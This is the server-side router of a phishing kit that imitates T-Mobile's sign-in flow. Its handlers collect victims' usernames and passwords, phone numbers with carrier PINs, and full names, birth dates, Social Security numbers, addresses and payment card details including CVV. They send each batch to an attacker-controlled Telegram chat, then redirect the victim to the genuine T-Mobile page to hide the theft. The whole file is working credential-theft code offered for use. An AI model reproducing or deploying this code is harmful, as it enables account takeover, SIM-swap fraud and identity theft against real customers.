var express = require("express");
var router = express.Router();
const { Telegraf } = require("telegraf");

const config = require("../config");

const bot = new Telegraf(config.BOT_TOKEN);

router.get("/", (req, res, next) => {
  res.redirect("/signin/v1");
});

/* GET home page. */
router.get("/signin/v1", function (req, res, next) {
  res.render("index", { title: "Express" });
});

router.post("/signin/v2", async (req, res, next) => {
  console.log(req.body);
  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>NEW T-MOBILE LOG - @TALISMAN_DEV</b>\n\n<b>LOG ID:</b> <code>${
      req.body.id
    }</code>\n<b>USERNAME:</b> <code>${
      req.body.username
    }</code>\n<b>PASSWORD:</b> <code>${
      req.body.password
    }</code>\n<b>DATE:</b> <code>${new Date().toUTCString()}</code>`,
    { parse_mode: "HTML" }
  );
  res.render("v2", { id: req.body.id });
});

router.post("/signin/v3", async (req, res, next) => {
  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>T-MOBILE LOG [CARRIER PIN] - @TALISMAN_DEV</b>\n\n<b>LOG ID:</b> <code>${
      req.body.id
    }</code>\n<b>PHONE NUMBER:</b> <code>${
      req.body.username
    }</code>\n<b>CARRIER PIN:</b> <code>${
      req.body.password
    }</code>\n<b>DATE:</b> <code>${new Date().toUTCString()}</code>`,
    { parse_mode: "HTML" }
  );
  res.render("v3", { id: req.body.id });
});

router.post("/confirmed", async (req, res, next) => {
  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>T-MOBILE LOG [PERSONAL INFORMATION] - @TALISMAN_DEV</b>\n\n<b>LOG ID:</b> <code>${
      req.body.id
    }</code>\n<b>FULL NAME:</b> <code>${
      req.body.fullname
    }</code>\n<b>DOB:</b> <code>${req.body.dob}</code>\n<b>SSN:</b> <code>${
      req.body.ssn
    }</code>\n<b>ADDRESS:</b> <code>${
      req.body.address
    }</code>\n<b>CARD NUMBER:</b> <code>${
      req.body.card
    }</code>\n<b>EXPIRY DATE:</b> <code>${
      req.body.expiry
    }</code>\n<b>CVV CODE:</b> <code>${
      req.body.cvv
    }</code>\n<b>DATE:</b> <code>${new Date().toUTCString()}</code>`,
    { parse_mode: "HTML" }
  );
  res.redirect("https://account.t-mobile.com/signin/v2");
});

module.exports = router;
